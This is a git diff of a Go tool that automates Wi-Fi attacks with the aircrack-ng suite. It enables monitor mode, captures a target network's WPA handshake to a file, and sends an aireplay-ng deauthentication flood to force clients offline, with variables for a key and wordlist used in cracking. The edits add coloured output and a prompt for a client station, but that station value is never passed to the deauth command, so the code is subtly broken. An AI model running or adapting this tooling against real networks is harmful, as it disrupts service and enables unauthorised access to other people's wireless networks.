@@ -717,27 +717,27 @@ func startMonitorMode(adapter string) error {
 	cmd.Stderr = os.Stderr
 	err := cmd.Run()
 	if err!= nil {
-		fmt.Println("Error starting monitor mode:", err)
+		fmt.Println(Red + "Error " + Reset + "starting monitor mode:", err)
 		return err
 	}
 
-	fmt.Println("Monitor mode started successfully.")
+	fmt.Println("Monitor mode started " + Green + "successfully" + Reset + ".")
 	return nil
 }
 
 func captureTraffic() error {
-    fmt.Println("Opening new terminal window and capturing wireless traffic")
+    fmt.Println("Opening new terminal window and capturing wireless traffic.")
     // Adjusted to include a continuous monitoring argument
     return launchTerminal("airodump-ng", "wlan0mon")
 }
 
 
 func scanTarget(BSSID, channel string) error {
-	fmt.Printf("Opening new terminal for target %s\n", BSSID)
-	return launchTerminal("airodump-ng --bssid " + BSSID + " -c " + channel + " --write WPAcrack wlan0mon")
+	fmt.Printf("Opening new terminal for target %s\n", Green + BSSID + Reset)
+	return launchTerminal("airodump-ng --bssid " + BSSID + " -c" + channel + " --write " + BSSID+"_WPAcrack wlan0mon")
 }
 
-func deauthenticateTarget(BSSID string) error {
+func deauthenticateTarget(BSSID , Station string) error {
 	fmt.Println("Turning target offline...")
 	return launchTerminal("aireplay-ng --deauth 100 -a "+BSSID+" wlan0mon")
 }
@@ -763,22 +763,16 @@ func MonitorMode() {
 		return
 	}
 
-	err := startMonitorMode(adapter)
-	if err != nil {
-		fmt.Println("Failed to enter monitor mode:", err)
-		return
-	}
-	fmt.Println("Monitor mode started successfully.")
-
+	startMonitorMode(adapter)
 	// Scanning Wireless Traffic
-	err = captureTraffic()
+	err := captureTraffic()
 	if err != nil {
-		fmt.Println("Failed to capture wireless traffic:", err)
+		fmt.Println(Red + "Failed " + Reset + "to capture wireless traffic with error :", err)
 		return
 	}
 
 	// Focusing on Target
-	var BSSID, channel, key, wordlistfile string
+	var BSSID, channel, Station, key, wordlistfile string
 
 	fmt.Print("Target BSSID: ")
 	scanner.Scan()
@@ -790,13 +784,21 @@ func MonitorMode() {
 
 	err = scanTarget(BSSID, channel)
 	if err != nil {
-		fmt.Println("Failed to scan target:", err)
+		fmt.Println(Red + "Failed " + Reset + "to scan target:", BSSID)
+		fmt.Println("Error : ", err)
 		return
 	}
 
-	err = deauthenticateTarget(BSSID)
+	// choosing client in target network to deauth
+	fmt.Print("Choose client on network to deauthenticate \n")
+	fmt.Print("Station : ")
+	scanner.Scan()
+	Station = scanner.Text()
+
+	err = deauthenticateTarget(BSSID, Station)
 	if err != nil {
-		fmt.Println("Failed to deauthenticate target:", err)
+		fmt.Println(Red + "Failed " + Reset + "to deauthenticate target:", BSSID)
+		fmt.Println("Error : ", err)
 		return
 	}
 
